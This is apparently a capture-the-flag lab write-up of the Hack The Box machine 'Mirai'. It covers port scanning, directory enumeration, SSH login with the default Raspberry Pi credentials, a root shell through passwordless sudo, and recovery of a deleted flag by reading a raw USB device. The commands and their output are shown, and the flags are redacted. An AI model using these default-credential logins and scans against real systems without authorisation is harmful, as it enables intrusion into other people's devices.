## Default Information
IP Address: 10.10.10.48\
OS: Linux

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.48    mirai.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.48 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-11-17 16:32:28 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 1940/tcp on 10.10.10.48                                   
Discovered open port 80/tcp on 10.10.10.48                                     
Discovered open port 22/tcp on 10.10.10.48                                     
Discovered open port 32414/udp on 10.10.10.48                                  
Discovered open port 53/tcp on 10.10.10.48                                     
Discovered open port 32400/tcp on 10.10.10.48                                  
Discovered open port 32469/tcp on 10.10.10.48                                  
Discovered open port 53/udp on 10.10.10.48
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each TCP port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 22	| SSH | OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0) | Open |
| 53	| domain | dnsmasq 2.76 | Open |
| 80	| HTTPd | lighttpd 1.4.35 | Open |
| 1773	| upnp | Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) | Open |
| 32400	| httpd | Plex Media Server httpd | Open |
| 32469	| upnp | Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50) | Open |

Afterwwards, we will use Nmap to enumerate the services operating behind each of the UDP ports using the open ports from masscan

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 53	| domain | dnsmasq 2.76 | Open |
| 5352	| mdns | DNS-based service discovery | Open |

From the nmap output, we are able to find 2 interesting HTTP ports, namely port 80 and port 32400. Port 80 is the normal port used for all HTTP services, while port 32400 is
used to host the media server, which is worth to look into

### Gobuster
We will then use Gobuster to find the endpoints that are accessible from http://mira.htb:80

```
http://10.10.10.48:80/_framework/blazor.webassembly.js (Status: 200) [Size: 61]
http://10.10.10.48:80/admin                (Status: 301) [Size: 0] [--> http://10.10.10.48:80/admin/]
http://10.10.10.48:80/swfobject.js         (Status: 200) [Size: 61]
```
We will also tried to find virtual hosts on http://sense.htb, but we were unable to find any vhosts.

Next, we will try to find the endpoints that are accessible from http://mira.htb:32400. However, there were a lot of false positives and so, I will not be listing them down 
below. Let's just first move on to see if we can find any flags without using http://mira.htb:32400.

### Web-content discovery
Looking at port 80, both http://mirai.htb:80/swfobject.js and http://mirai.htb:80/_framework/blazor.webassembly.js did not provide any meaningful output. It only shows a short 
text regarding Pi-hole

```
var x = "Pi-hole: A black hole for Internet advertisements."
```

However, http://mirai.htb:80/admin/ brings us to the admin page for Pi-hole, and we are also able to access the login page. What is interesting about the login page is that it 
only allow us to input the password, but not the username. This gives me the idea that this page might be using a default username for all the users, and so it might possibly be
using a default password as well.

![mirai admin page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Mirai/admin_login.png)

Let's first do some research into Pi-hole. Pi-hole is actually a DNS sinkhole that prevents any unwanted content without installing any client-side applications. We also know thatna password will be randomly generated on the first installation and displayed to the user. Afterwards, the password cannot be retrieved. Apart from that, we also know that Pi-hole is commonly used for Raspberry Pi.

## Exploit
Let's first try to use the default password _raspberry_ to login to Pi-hole. However, it seems that this is not the password for Pi-hole. We remember that we this machine has an SSH terminal on port 22 during our enumeration. Let's try to use the default credentials for Raspberry Pi on the SSH terminal, and it looks like we have found the correct credentials for the SSH terminal.

```
┌──(kali㉿kali)-[~]
└─$ ssh pi@10.10.10.48        
The authenticity of host '10.10.10.48 (10.10.10.48)' can't be established.
ECDSA key fingerprint is SHA256:UkDz3Z1kWt2O5g2GRlullQ3UY/cVIx/oXtiqLPXiXMY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.48' (ECDSA) to the list of known hosts.
pi@10.10.10.48's password: 
pi@raspberrypi:~ $ 
```
### Obtaining user flag
```
pi@raspberrypi:~/Desktop $ cat /home/pi/Desktop/user.txt
<Redacted user flag>
pi@raspberrypi:~/Desktop 
```

### Privilege Escalation to root
Checking the privileges on the user _pi_, we realize that _pi_ is able to execute any commands as a root user
```
pi@raspberrypi:~/Desktop $ sudo -l
Matching Defaults entries for pi on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pi may run the following commands on localhost:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: ALL
```
Now, let's escalate the privileges to a root user
```
pi@raspberrypi:~/Desktop $ sudo bash
root@raspberrypi:/home/pi/Desktop# whoami
root
root@raspberrypi:/home/pi/Desktop# 
```
### Obtaining root flag
Let's now retrieve the root flag. However, we realize that the current root.text file is not the flag that we are looking for
```
root@raspberrypi:~# cat /root/root.txt
I lost my original root.txt! I think I may have a backup on my USB stick...
root@raspberrypi:~# 
```

Firstly, let us find where the USB stick is mounted to using _df -h_. From the output, the USB stick is mounted to /media/usbstick.

```
root@raspberrypi:~# df -h
Filesystem      Size  Used Avail Use% Mounted on
aufs            8.5G  2.8G  5.3G  34% /
tmpfs           100M  8.8M   92M   9% /run
/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1
/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs
tmpfs           250M     0  250M   0% /lib/live/mount/overlay
/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2
devtmpfs         10M     0   10M   0% /dev
tmpfs           250M  8.0K  250M   1% /dev/shm
tmpfs           5.0M  4.0K  5.0M   1% /run/lock
tmpfs           250M     0  250M   0% /sys/fs/cgroup
tmpfs           250M  8.0K  250M   1% /tmp
/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick
tmpfs            50M     0   50M   0% /run/user/999
tmpfs            50M     0   50M   0% /run/user/1000
```

Next, navigating to /media/usbstick, we discover a _damnit.txt_ that tells us that we would need to recover the files off the USB stick

```
root@raspberrypi:~# cd /media/usbstick
root@raspberrypi:/media/usbstick# cat damnit.txt
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
```

From the earlier _df -h_ command, we know that the USB stick is mounted to /dev/sdb. Using the cat command, we are able to retrieve the root flag.

```
root@raspberrypi:/dev# cat sdb
�|}*,.�▒����+-���<Redacted root flag>
Damnit! Sorry man I accidentally deleted your files off the USB stick.
Do you know if there is any way to get them back?

-James
root@raspberrypi:/dev# 
```
